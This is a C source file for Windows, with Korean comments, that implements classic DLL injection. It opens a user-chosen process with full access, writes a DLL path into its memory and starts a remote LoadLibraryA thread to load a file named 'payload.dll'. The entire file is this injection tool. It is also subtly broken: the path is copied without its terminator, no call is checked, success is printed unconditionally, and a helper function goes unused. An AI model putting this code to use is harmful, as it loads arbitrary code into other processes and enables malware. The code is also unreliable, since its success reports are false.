#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* 대상 프로세스에서 특정 모듈의 베이스 주소를 찾는다 */
static HMODULE find_remote_module(DWORD pid, const char* modname)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    MODULEENTRY32 me = { 0 };
    HMODULE h = NULL;
    if (snap == INVALID_HANDLE_VALUE) return NULL;
    me.dwSize = sizeof(me);
    if (Module32First(snap, &me)) {
        do {
            if (_stricmp(me.szModule, modname) == 0) { h = me.hModule; break; }
        } while (Module32Next(snap, &me));
    }
    CloseHandle(snap);
    return h;
}

int inject(DWORD pid, const char* dll_path)
{
    HANDLE proc, thread;
    LPVOID remote;
    SIZE_T len = strlen(dll_path);
    FARPROC pLoadLibrary;
    DWORD exit_code = 0;

    printf("[*] 대상 PID = %lu\n", pid);
    printf("[*] DLL      = %s\n", dll_path);

    proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    printf("[1] OpenProcess 성공 (handle=%p)\n", proc);

    remote = VirtualAllocEx(proc, NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("[2] VirtualAllocEx  -> %p (%zu bytes)\n", remote, len);

    WriteProcessMemory(proc, remote, dll_path, len, NULL);

    pLoadLibrary = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

    thread = CreateRemoteThread(proc, NULL, 0,
        (LPTHREAD_START_ROUTINE)pLoadLibrary,
        remote, 0, NULL);

    printf("[5] CreateRemoteThread 생성, 완료 대기중...\n");
    printf("[+] 인젝션 성공\n");
    return 0;
}

int main(int argc, char** argv)
{
    DWORD pid;
    printf("Injection 대상 프로세스 ID: ");
    scanf("%d", &pid);
    inject(pid, "payload.dll");
}
